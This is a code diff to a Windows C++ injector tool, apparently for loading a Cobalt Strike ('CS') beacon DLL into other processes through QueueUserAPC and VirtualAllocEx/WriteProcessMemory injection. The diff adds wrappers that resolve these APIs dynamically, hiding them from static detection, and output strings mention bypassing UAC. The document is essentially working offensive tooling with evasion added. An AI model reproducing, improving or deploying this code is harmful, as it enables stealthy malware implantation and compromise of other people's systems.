@@ -5,7 +5,63 @@
 #include<Tlhelp32.h>
 #include <cctype> 
 using namespace std;
-#pragma comment(linker, "/section:.data,RWE")
+
+DWORD Hide_QueueUserAPC(
+	_In_ PAPCFUNC pfnAPC,
+	_In_ HANDLE hThread,
+	_In_ ULONG_PTR dwData
+)
+{
+	typedef DWORD(WINAPI* Fn_QueueUserAPC)(
+		_In_ PAPCFUNC pfnAPC,
+		_In_ HANDLE hThread,
+		_In_ ULONG_PTR dwData
+		);
+	HMODULE QueueUserAPCHandle = GetModuleHandleW(L"Kernel32.dll");
+	Fn_QueueUserAPC ptr = (Fn_QueueUserAPC)GetProcAddress(QueueUserAPCHandle, "QueueUserAPC");
+	return ptr(pfnAPC, hThread, dwData);
+
+}
+LPVOID Hide_VirtualAllocEx(
+	_In_ HANDLE hProcess,
+	_In_opt_ LPVOID lpAddress,
+	_In_ SIZE_T dwSize,
+	_In_ DWORD flAllocationType,
+	_In_ DWORD flProtect
+)
+{
+	typedef LPVOID(WINAPI* Fn_VirtualAllocEx)(
+		_In_ HANDLE hProcess,
+		_In_opt_ LPVOID lpAddress,
+		_In_ SIZE_T dwSize,
+		_In_ DWORD flAllocationType,
+		_In_ DWORD flProtect
+		);
+	HMODULE	VirtualAllocExHandle = GetModuleHandleW(L"Kernel32.dll");
+	Fn_VirtualAllocEx ptr = (Fn_VirtualAllocEx)GetProcAddress(VirtualAllocExHandle, "VirtualAllocEx");
+	return ptr(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
+}
+
+BOOL Hide_WriteProcessMemory(
+	_In_ HANDLE hProcess,
+	_In_ LPVOID lpBaseAddress,
+	_In_reads_bytes_(nSize) LPCVOID lpBuffer,
+	_In_ SIZE_T nSize,
+	_Out_opt_ SIZE_T* lpNumberOfBytesWritten
+) {
+	typedef BOOL(*Fn_WriteProcessMemory)(
+		_In_ HANDLE hProcess,
+		_In_ LPVOID lpBaseAddress,
+		_In_reads_bytes_(nSize) LPCVOID lpBuffer,
+		_In_ SIZE_T nSize,
+		_Out_opt_ SIZE_T* lpNumberOfBytesWritten
+		);
+
+	HMODULE	WriteProcessMemoryHandle = GetModuleHandleW(L"KernelBase.dll");
+	Fn_WriteProcessMemory ptr = (Fn_WriteProcessMemory)GetProcAddress(WriteProcessMemoryHandle, "WriteProcessMemory");
+	return ptr(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
+}
+
 
 BOOL EnableDebugPrivilege()
 {
@@ -69,7 +125,7 @@ void APCInject(DWORD pid, LPCWSTR dllpath)
 
 	//2.远程申请内存
 	DWORD length = (wcslen(dllpath) + 2) * sizeof(TCHAR);
-	PVOID RemoteMemory = VirtualAllocEx(TargetHandle, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READ);
+	PVOID RemoteMemory = Hide_VirtualAllocEx(TargetHandle, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READ);
 	if (RemoteMemory == NULL)
 	{
 		cout << "	[-] VirtualAlloc Address Failed :(" << endl;
@@ -80,7 +136,7 @@ void APCInject(DWORD pid, LPCWSTR dllpath)
 	}
 	//3.将上线的DLL的路径写入内存
 
-	BOOL WriteStatus = WriteProcessMemory(TargetHandle, RemoteMemory, dllpath, length, NULL);
+	BOOL WriteStatus = Hide_WriteProcessMemory(TargetHandle, RemoteMemory, dllpath, length, NULL);
 	if (WriteStatus == 0)
 	{
 		cout << "	[-] Write CS's DLL Into Memory Failed :(" << endl;
@@ -127,7 +183,7 @@ void APCInject(DWORD pid, LPCWSTR dllpath)
 			ThreadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);  //获取目标线程的句柄
 			if (ThreadHandle)
 			{
-				DWORD dwRet = QueueUserAPC((PAPCFUNC)LoadLibraryAddress, ThreadHandle, (ULONG_PTR)RemoteMemory);  //插入APC函数
+				DWORD dwRet = Hide_QueueUserAPC((PAPCFUNC)LoadLibraryAddress, ThreadHandle, (ULONG_PTR)RemoteMemory);  //插入APC函数
 				if (dwRet == TRUE)
 				{
 					flag++;
@@ -143,7 +199,7 @@ void APCInject(DWORD pid, LPCWSTR dllpath)
 				ThreadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
 				if (ThreadHandle)
 				{
-					DWORD dwRet = QueueUserAPC((PAPCFUNC)LoadLibraryAddress, ThreadHandle, (ULONG_PTR)RemoteMemory);
+					DWORD dwRet = Hide_QueueUserAPC((PAPCFUNC)LoadLibraryAddress, ThreadHandle, (ULONG_PTR)RemoteMemory);
 					if (dwRet == TRUE)
 					{
 						flag++;
@@ -190,9 +246,12 @@ void DLLInject(DWORD pid, LPCWSTR dllpath)
 	}
 	//2.远程申请内存
 	DWORD  length = (wcslen(dllpath) + 1) * sizeof(TCHAR);
-	PVOID  RemoteMemory = VirtualAllocEx(OriginalProcessHandle, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READ);
+
+	PVOID  RemoteMemory = Hide_VirtualAllocEx(OriginalProcessHandle, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READ);
+	
 	if (RemoteMemory == NULL)
 	{
+
 		cout << "	[-] VirtualAlloc Address Failed :(" << endl;
 		return;
 	}
@@ -200,7 +259,7 @@ void DLLInject(DWORD pid, LPCWSTR dllpath)
 		cout << "	[+] VirtualAlloc Address Successfully :)" << endl;
 	}
 	//3.将CS上线的DLL写入内存
-	BOOL WriteStatus = WriteProcessMemory(OriginalProcessHandle, RemoteMemory, dllpath, length, NULL);
+	BOOL WriteStatus = Hide_WriteProcessMemory(OriginalProcessHandle, RemoteMemory, dllpath, length, NULL);
 	if (WriteStatus == 0)
 	{
 		cout << "	[-] Write CS's DLL Into Memory Failed :(" << endl;
@@ -322,6 +381,7 @@ int _tmain(int argc, TCHAR* argv[])
 				cout << "	[-] Privilege Elevated Failed, You Haven't Bypassed UAC :( " << endl;
 			}
 			DWORD PID = GetProcessPID(argv[1]);
+
 			DLLInject(PID, argv[2]);
 
 
